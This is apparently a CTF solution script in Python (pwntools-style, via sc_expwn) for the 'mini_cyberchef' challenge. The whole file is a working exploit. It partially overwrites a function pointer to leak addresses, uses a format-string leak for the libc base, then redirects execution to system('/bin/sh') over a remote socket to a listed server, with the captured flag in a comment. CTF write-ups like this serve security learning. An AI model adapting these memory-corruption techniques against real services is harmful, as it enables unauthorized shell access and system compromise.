#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import codecs

bin_file = './mini_cyberchef_production'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'34.84.121.206', 'port':30008})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)
ofs_main            = binf.sep_function['main']

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_main           = libc.sep_function['__libc_start_main']

#==========
def attack(conn, **kwargs):
    rot13 = bytes.maketrans(
        b'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',
        b'nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM')

    conn.sendlineafter(b'> ', b'3')
    conn.sendlineafter(b'> ', b'a'*0xf7+b'!'+p16(ofs_main+0x13c))
    
    conn.recvuntil(b'n!')
    addr_main = u(conn.recvuntil(b'\n', drop=True)) - 0x13c

    binf.address = addr_main - ofs_main
    info('addr_binf_base    = 0x{:012x}'.format(binf.address))
    addr_plt_printf      = binf.plt['printf']

    exploit  = b'%11$p'.ljust(0xf8)
    exploit += p64(addr_main + 0x7b)[:-1]
    conn.sendlineafter(b'Restore\n', exploit.translate(rot13))

    conn.recvuntil(b'Restore\n')
    addr_libc_main = int(conn.recvuntil(b' '), 16) - 0x80 + 0xb0
    libc.address = addr_libc_main - ofs_libc_main
    info('addr_libc_base    = 0x{:012x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']

    exploit  = b'/bin/sh\x00'.ljust(0xf8)
    exploit += p64(addr_libc_system)[:-1]
    conn.sendline(b'3')
    conn.sendlineafter(b'> ', exploit.translate(rot13))

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.interactive()
    # TSGLIVE{func710n_p01n73r_0v3rwr173_15_a_pr1m171v3_7ha7_may_3v0lv3_1n70_FSB}

if __name__=='__main__':
    main()

#==========
